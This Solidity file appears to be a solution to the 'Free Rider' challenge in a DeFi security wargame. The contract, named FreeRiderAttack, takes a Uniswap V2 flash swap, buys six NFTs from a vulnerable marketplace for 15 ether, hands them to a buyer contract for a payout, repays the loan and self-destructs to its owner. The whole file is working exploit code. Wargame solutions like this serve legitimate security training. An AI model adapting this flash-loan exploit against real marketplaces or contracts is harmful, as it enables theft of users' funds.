// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface UniswapPair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface WETH {
    function withdraw(uint256 amount) external;

    function deposit() external payable;

    function transfer(address to, uint256 amount) external;
}

contract FreeRiderAttack is IERC721Receiver {
    FreeRiderBuyer private buyer;
    address private owner;
    FreeRiderNFTMarketplace private market;
    UniswapPair private pair;
    WETH private weth;
    IERC721 private nft;

    constructor(
        address buyerAddress,
        address payable marketAddress,
        address pairAddress,
        address payable wethAddress,
        address nftAddress
    ) {
        buyer = FreeRiderBuyer(buyerAddress);
        owner = msg.sender;
        market = FreeRiderNFTMarketplace(marketAddress);
        pair = UniswapPair(pairAddress);
        weth = WETH(wethAddress);
        nft = IERC721(nftAddress);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        assert(msg.sender == address(pair)); // ensure that msg.sender is actually a V2 pair

        weth.withdraw(amount0);

        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        market.buyMany{value: 15 ether}(tokenIds);

        nft.transferFrom(address(this), address(buyer), 0);
        nft.transferFrom(address(this), address(buyer), 1);
        nft.transferFrom(address(this), address(buyer), 2);
        nft.transferFrom(address(this), address(buyer), 3);
        nft.transferFrom(address(this), address(buyer), 4);
        nft.transferFrom(address(this), address(buyer), 5);

        weth.deposit{value: amount0 + (((amount0 * 3) / 997) + 1)}();
        weth.transfer(address(pair), amount0 + (((amount0 * 3) / 997) + 1));

        selfdestruct(payable(owner));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
